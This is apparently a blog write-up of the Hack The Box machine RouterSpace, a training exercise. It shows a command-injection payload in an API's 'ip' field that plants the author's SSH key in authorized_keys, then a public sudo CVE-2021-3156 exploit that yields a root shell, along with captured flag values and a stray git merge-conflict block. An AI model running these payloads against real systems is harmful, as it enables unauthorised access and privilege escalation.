---
title: Hackthebox-routerspace-Writeup 
ayout: post
image: "https://raw.githubusercontent.com/Spy0x7/Spy0x7.github.io/master/assets/routerspace/routerspace.png"
tags: [hackthebox, CTF]
---


### nmap

```shel
┌[spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace]
└╼[★]$nmap -sC -sV -oA nmap 10.10.11.148

Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-05 21:36 PKT
Nmap scan report for 10.10.11.148
Host is up (0.18s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
80/tcp open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-84175
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 65
|     ETag: W/"41-bo9lk6+f+tZQb/ChPLEuYmd0j6g"
|     Date: Sat, 05 Mar 2022 16:54:44 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: b X kMM X 7 }
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-76967
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Sat, 05 Mar 2022 16:54:42 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-67272
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Sat, 05 Mar 2022 16:54:43 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-title: RouterSpace
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.60%I=7%D=3/5%Time=6223919F%P=x86_64-pc-linux-gnu%r(NULL,
SF:29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.60%I=7%D=3/5%Time=6223919F%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,2E91,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX
SF:-Cdn:\x20RouterSpace-76967\r\nAccept-Ranges:\x20bytes\r\nCache-Control:
SF:\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x202021
SF:\x2011:33:57\x20GMT\r\nETag:\x20W/\"652c-17d476c9285\"\r\nContent-Type:
SF:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x2
SF:0Sat,\x2005\x20Mar\x202022\x2016:54:42\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n<!doctype\x20html>\n<html\x20class=\"no-js\"\x20lang=\"zxx\">\n<h
SF:ead>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<met
SF:a\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x20\x
SF:20\x20<title>RouterSpace</title>\n\x20\x20\x20\x20<meta\x20name=\"descr
SF:iption\"\x20content=\"\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x
SF:20content=\"width=device-width,\x20initial-scale=1\">\n\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\">\n\x2
SF:0\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/owl\.carousel\.m
SF:in\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/m
SF:agnific-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20h
SF:ref=\"css/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"sty
SF:lesheet\"\x20href=\"css/themify-icons\.css\">\n\x20")%r(HTTPOptions,108
SF:,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20R
SF:outerSpace-67272\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/ht
SF:ml;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\"d-bMedpZY
SF:GrVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Sat,\x2005\x20Mar\x202022\x2016:54:
SF:43\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST")%r(RTSPRequest,
SF:2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n"
SF:)%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20c
SF:lose\r\n\r\n")%r(FourOhFourRequest,127,"HTTP/1\.1\x20200\x20OK\r\nX-Pow
SF:ered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-84175\r\nContent-Type:
SF:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2065\r\nETag:\x20W/
SF:\"41-bo9lk6\+f\+tZQb/ChPLEuYmd0j6g\"\r\nDate:\x20Sat,\x2005\x20Mar\x202
SF:022\x2016:54:44\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20act
SF:ivity\x20detected\x20!!!\x20{RequestID:\x20b\x20\x20\x20X\x20\x20kMM\x2
SF:0\x20X\x207\x20\x20}\n\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.97 seconds
```

Let’s visit port 8080

![website](/assets/routerspace/home.png)

This appears to be a routing management system for an apartment

first look around

Here, Download in the upper right corner will download an apk package. After downloading, use the simulator to run it and then burp to capture the package.

need to install AnBox After installation, we start the emulator

```adb shell settings put global http_proxy 192.168.18.4:8080```

Then after burp sets the listening port, use burp to proxy anbox

```
[spy0x7㉿pop-os]─[/home/spy0x7/Downloads]
└╼[★]$adb install RouterSpace.apk
Success
```

![website](/assets/routerspace/install.png)

Install the app, then open

![website](/assets/routerspace/click.png)


click on Check Status and intercept this in burp.

![website](/assets/routerspace/intercept.png)

send it to repeater tab.

![website](/assets/routerspace/repeater.png)

Add routerspace.htb to hosts

```sudo echo 10.10.11.148 routerspace.htb >> /etc/hosts```


let's play with the Request :) 

try to execute the command

![website](/assets/routerspace/id.png)

oh it's work command execute successfully


let's try to generate a sshkey, and then write it in to log in with ssh.

```
┌[spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace]
└╼[★]$ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/spy0x7/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/spy0x7/.ssh/id_rsa.
Your public key has been saved in /home/spy0x7/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:rTz1OM1hCkc75iB/wFp7RaE9o4MDxfzV3FuEmNxCBRY spy0x7@pop-os
The key's randomart image is:
+---[RSA 2048]----+
|       o.  oEX.+.|
|       .o  +*.= o|
|      .  .o.=.  o|
|       o +.+ o . |
|      . S X +    |
|       * % @ .   |
|      . * B +    |
|         + .     |
|                 |
+----[SHA256]-----+
```

Then save the content of id_rsa.pub as authorized_keys


```
{"ip":"0.0.0.0|echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAAQDEfXW5jWSjNdbuSVZWszzfpNq/oeG+WwH5imomLf/N7QJNKAWkbFTk3RMxRBzy9a3pHF7CubMLhykOzjz+4ap22GDkjdA/FL4ha9siGXboor+dpqm4WcfjPy6CdQUroHV0qfNNOz5qT0SfeATsi1udmv8oh1MAfeFNTLaXM0w7JP6EHdcIo2OdJJOsy0jBwQEIf3LsRLl2Q8VLtltR28N7ZTcJzUcuGZpksv3OvUDt2f4NxZCtL3vMwkTJj5wkJy8CpGti473QG2pPU3BcRKOY+RvycqJA3Hz6nN3dbG7lXDEa6PgrzuUXb6dJTB9Rseqq0c69QCHnvQ3B/1ZLig/b spy0x7@pop-os' > /home/paul/.ssh/authorized_keys"}
```

Then use ssh to log in

```
┌[spy0x7㉿pop-os]─[/home/spy0x7/.ssh]
└╼[★]$ssh paul@10.10.11.148
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 05 Mar 2022 05:28:13 PM UTC

  System load:           0.03
  Usage of /:            70.6% of 3.49GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             213
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.148
  IPv6 address for eth0: dead:beef::250:56ff:feb9:29a7

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

80 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Mar  5 15:41:03 2022 from 10.10.15.171
paul@routerspace:~$ 
paul@routerspace:~$ ls
snap  user.txt
paul@routerspace:~$
```
Successfully login on user 

```
paul@routerspace:~$ cat user.txt 
75e43b546b55786f3e9435473fd56c26
```

Get the flag

Privilege escalation time :)

First, We run a linpeas.sh script to see if there are any privilege escalation

After running we see sudo 1.8.31 is vulnerable.

There is a vulnerability CVE-2021-3156 seen here

<<<<<<< HEAD
There is a vulnerability CVE-2021-3156 seen here

=======
>>>>>>> 534dd6968d793572856fa8539630ade5f48b70c7
https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit


Let's transfer the exploit through ssh.


```
┌[]─[10.10.14.176][spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace/Sudo-1.8.31-Root-Exploit]
└╼[★]$scp -i /root/.ssh/id_rsa shellcode.c  paul@10.10.11.148:.
Warning: Identity file /root/.ssh/id_rsa not accessible: Permission denied.
shellcode.c                                                                                          100%  599     3.3KB/s   00:00    
┌[]─[10.10.14.176][spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace/Sudo-1.8.31-Root-Exploit]
└╼[★]$scp -i /root/.ssh/id_rsa Makefile  paul@10.10.11.148:.
Warning: Identity file /root/.ssh/id_rsa not accessible: Permission denied.
Makefile                                                                                             100%  208     1.2KB/s   00:00    
┌[]─[10.10.14.176][spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace/Sudo-1.8.31-Root-Exploit]
└╼[★]$scp -i /root/.ssh/id_  paul@10.10.11.148:.
┌[]─[10.10.14.176][spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace/Sudo-1.8.31-Root-Exploit]
└╼[★]$scp -i /root/.ssh/id_rsa exploit.c  paul@10.10.11.148:.
file
exploit.c
```

lets run our exploit

```
paul@routerspace:~/exploit$ make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c
paul@routerspace:~/exploit$ ./exploit 
# id
uid=0(root) gid=0(root) groups=0(root),1001(paul)
# cat /root/root.txt
567eb556acf2d31ef537b9cfde601e30
```

Successfully root the machine




